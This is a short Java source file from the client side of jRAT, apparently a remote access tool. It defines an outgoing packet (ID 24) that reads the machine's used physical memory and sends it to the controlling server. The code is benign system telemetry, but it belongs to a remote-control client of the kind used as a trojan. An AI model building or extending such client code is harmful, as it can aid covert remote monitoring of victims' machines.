package jrat.client.packets.outgoing;

import com.sun.management.OperatingSystemMXBean;
import jrat.client.Connection;

import java.lang.management.ManagementFactory;


public class Packet24UsedMemory implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		long total = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
		long free = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getFreePhysicalMemorySize();

		con.writeLong(total - free);
	}

	@Override
	public short getPacketId() {
		return 24;
	}

}
